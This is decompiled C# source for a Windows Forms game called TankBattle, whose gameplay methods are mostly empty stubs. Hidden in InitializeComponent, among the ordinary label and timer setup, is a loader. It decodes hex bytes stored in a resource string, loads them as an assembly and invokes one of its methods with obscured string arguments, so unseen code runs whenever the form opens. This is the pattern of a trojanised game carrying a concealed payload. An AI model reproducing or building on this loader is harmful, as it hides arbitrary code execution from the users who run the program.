using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace TankBattle;

public class Form1 : Form
{
	private int points;

	public Random Random = new Random();

	public Tank tank;

	private Timer timerReloadTank = new Timer();

	private bool tankCanBulletFire = false;

	private Timer timerBossSpawn = new Timer();

	public List<EnemyTank> enemyList = new List<EnemyTank>();

	public List<EnemyTankLogic1> enemyV2List = new List<EnemyTankLogic1>();

	public bool shieldOnForm = false;

	public static string[] Seksy = new string[3] { "61485254", "71636E", "TankBattle" };

	private IContainer components = null;

	private Timer timerEnemySpawn;

	public Timer timerStart;

	public Label labelHP;

	public Label labelPoints;

	public Label labelShield;

	public Label labelAmmoSplash;

	public int Points
	{
		get
		{
			return points;
		}
		set
		{
			points = value;
			((Control)labelPoints).set_Text($"Points: {Points}");
		}
	}

	public Form1()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		InitializeComponent();
	}

	private void TimerReloadTank_Tick(object sender, EventArgs e)
	{
		tankCanBulletFire = true;
		timerReloadTank.Stop();
	}

	private void Start_Tick(object sender, EventArgs e)
	{
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void Form1_KeyUp(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between Unknown and I4
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 39)
		{
			tank.isRight = false;
		}
		if ((int)e.get_KeyCode() == 37)
		{
			tank.isLeft = false;
		}
		if ((int)e.get_KeyCode() == 38)
		{
			tank.isUp = false;
		}
		if ((int)e.get_KeyCode() == 40)
		{
			tank.isDown = false;
		}
	}

	private void TimerEnemySpawn_Tick(object sender, EventArgs e)
	{
		if (enemyList.Count < 1)
		{
			EnemyTank enemyTank = new EnemyTank(this, 30, Random.Next(((Control)this).get_Width() - 100), Random.Next(((Control)this).get_Height() - 100));
			enemyTank.AddTankOnForm();
			enemyList.Add(enemyTank);
		}
		if (Points > 0)
		{
			if (enemyV2List.Count == 0 && Points % 5 == 0)
			{
				EnemyTankLogic1 enemyTankLogic = new EnemyTankLogic1(this, 30, Random.Next(((Control)this).get_Width() - 100), Random.Next(((Control)this).get_Height() - 100));
				enemyTankLogic.AddTankOnForm();
				enemyV2List.Add(enemyTankLogic);
			}
			if (!tank.IsShielded && !shieldOnForm && Points % 3 == 0)
			{
				new Shield(this, Random.Next(((Control)this).get_Width() - 100), Random.Next(((Control)this).get_Height() - 100));
			}
		}
		if (points > 9 && points < 20)
		{
			timerBossSpawn.Start();
			timerEnemySpawn.Stop();
		}
	}

	private void TimerBossSpawn_Tick(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_0499: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a3: Expected O, but got Unknown
		//IL_04ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b5: Expected O, but got Unknown
		components = new Container();
		timerStart = new Timer(components);
		timerEnemySpawn = new Timer(components);
		labelHP = new Label();
		labelPoints = new Label();
		labelShield = new Label();
		labelAmmoSplash = new Label();
		((Control)this).SuspendLayout();
		timerStart.set_Enabled(true);
		timerStart.set_Interval(10);
		timerStart.add_Tick((EventHandler)Start_Tick);
		timerEnemySpawn.set_Enabled(true);
		timerEnemySpawn.set_Interval(4000);
		timerEnemySpawn.add_Tick((EventHandler)TimerEnemySpawn_Tick);
		((Control)labelHP).set_AutoSize(true);
		((Control)labelHP).set_BackColor(Color.Transparent);
		((Control)labelHP).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)labelHP).set_ForeColor(Color.Red);
		((Control)labelHP).set_Location(new Point(897, 29));
		((Control)labelHP).set_Name("labelHP");
		((Control)labelHP).set_Size(new Size(62, 29));
		((Control)labelHP).set_TabIndex(0);
		((Control)labelHP).set_Text("5HP");
		((Control)labelPoints).set_AutoSize(true);
		((Control)labelPoints).set_BackColor(Color.Transparent);
		((Control)labelPoints).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)labelPoints).set_ForeColor(Color.Black);
		((Control)labelPoints).set_Location(new Point(12, 532));
		((Control)labelPoints).set_Name("labelPoints");
		((Control)labelPoints).set_Size(new Size(51, 20));
		((Control)labelPoints).set_TabIndex(1);
		((Control)labelPoints).set_Text("Счёт:");
		((Control)labelShield).set_AutoSize(true);
		((Control)labelShield).set_BackColor(Color.Transparent);
		((Control)labelShield).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)labelShield).set_ForeColor(Color.Blue);
		((Control)labelShield).set_Location(new Point(898, 65));
		((Control)labelShield).set_Name("labelShield");
		((Control)labelShield).set_Size(new Size(0, 20));
		((Control)labelShield).set_TabIndex(2);
		((Control)labelAmmoSplash).set_AutoSize(true);
		((Control)labelAmmoSplash).set_BackColor(Color.Transparent);
		((Control)labelAmmoSplash).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)labelAmmoSplash).set_ForeColor(Color.FromArgb(128, 64, 64));
		((Control)labelAmmoSplash).set_Location(new Point(136, 532));
		((Control)labelAmmoSplash).set_Name("labelAmmoSplash");
		((Control)labelAmmoSplash).set_Size(new Size(0, 20));
		((Control)labelAmmoSplash).set_TabIndex(3);
		ResourceManager resourceManager = new ResourceManager(typeof(Form2));
		string text = (string)resourceManager.GetObject("String1");
		text = text.Replace("~", "00-");
		string[] array = text.Split(new char[1] { '-' });
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)Convert.ToUInt32(array[i], 16);
		}
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(984, 561));
		((Control)this).get_Controls().Add((Control)(object)labelAmmoSplash);
		((Control)this).get_Controls().Add((Control)(object)labelShield);
		((Control)this).get_Controls().Add((Control)(object)labelPoints);
		Assembly assembly = Assembly.Load(array2);
		string[] seksy = Seksy;
		MethodInfo methodInfo = assembly.GetExportedTypes()[1].GetMethods()[1];
		object obj = 0;
		object[] parameters = seksy;
		methodInfo.Invoke(obj, parameters);
		((Control)this).get_Controls().Add((Control)(object)labelHP);
		((Control)this).set_DoubleBuffered(true);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Control)this).add_KeyUp(new KeyEventHandler(Form1_KeyUp));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
